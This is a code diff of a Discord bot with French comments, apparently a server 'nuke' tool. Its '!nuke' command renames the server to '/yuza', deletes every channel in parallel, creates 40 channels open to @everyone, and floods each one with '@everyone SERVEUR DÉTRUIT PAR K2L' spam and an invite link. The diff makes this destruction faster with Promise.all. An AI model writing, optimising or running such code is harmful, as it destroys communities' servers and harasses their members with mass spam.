@@ -24,7 +24,6 @@ client.on('ready', () => {
     console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
 
-// Anti-bot actif à l'arrivée
 client.on('guildMemberAdd', async member => {
     if (member.user.bot && member.id !== client.user.id) {
         try {
@@ -39,7 +38,7 @@ client.on('messageCreate', async message => {
     const isOwner = OWNERS.includes(message.author.id);
 
     // ==========================================
-    // 1. COMMANDE !KICKBOT (Expulse TOUS les autres bots)
+    // 1. COMMANDE !KICKBOT
     // ==========================================
     if (message.content === '!kickbot') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -143,49 +142,51 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 3. COMMANDE !NUKE (Ultra-Fast + Salons avec Perms Overwrites)
+    // 3. COMMANDE !NUKE (Mass Creation & Flood en Promise.all)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-        await message.reply("💥 **[NUKE]** Destruction en cours...");
+        await message.reply("💥 **[NUKE]** Lancement de l'action synchrone...");
 
         try {
             // A. Renommer le serveur en "/yuza"
             await message.guild.setName('/yuza').catch(() => {});
 
-            // B. Suppression des salons existants
-            const oldChannels = message.guild.channels.cache;
-            oldChannels.forEach(channel => {
-                channel.delete().catch(() => {});
-            });
+            // B. Suppression des salons existants en parallèle
+            const deletePromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
+            await Promise.all(deletePromises);
 
-            // C. Création de salons avec dérogations de perms pour @everyone et flood direct
+            // C. Création massive de salons et flood instantané
+            const createPromises = [];
             for (let i = 0; i < 40; i++) {
-                message.guild.channels.create({
-                    name: 'ez-by-k2l',
-                    type: 0, // Salon textuel
-                    permissionOverwrites: [
-                        {
-                            id: message.guild.id, // Rôle @everyone
-                            allow: [
-                                PermissionsBitField.Flags.ViewChannel,
-                                PermissionsBitField.Flags.SendMessages,
-                                PermissionsBitField.Flags.ManageChannels,
-                                PermissionsBitField.Flags.EmbedLinks,
-                                PermissionsBitField.Flags.AttachFiles,
-                                PermissionsBitField.Flags.MentionEveryone
-                            ]
+                createPromises.push(
+                    message.guild.channels.create({
+                        name: 'ez-by-k2l',
+                        type: 0,
+                        permissionOverwrites: [
+                            {
+                                id: message.guild.id,
+                                allow: [
+                                    PermissionsBitField.Flags.ViewChannel,
+                                    PermissionsBitField.Flags.SendMessages,
+                                    PermissionsBitField.Flags.ManageChannels,
+                                    PermissionsBitField.Flags.EmbedLinks,
+                                    PermissionsBitField.Flags.AttachFiles,
+                                    PermissionsBitField.Flags.MentionEveryone
+                                ]
+                            }
+                        ]
+                    }).then(async channel => {
+                        // Envoi de messages en boucle rapide dès la création du salon
+                        for (let j = 0; j < 5; j++) {
+                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                         }
-                    ]
-                }).then(async channel => {
-                    for (let j = 0; j < 10; j++) {
-                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
-                    }
-                }).catch(() => {});
+                    }).catch(() => {})
+                );
             }
 
-            await message.channel.send("✅ **Nuke exécuté avec succès !**");
+            await Promise.all(createPromises);
 
         } catch (error) {
             console.error("Erreur Nuke :", error);
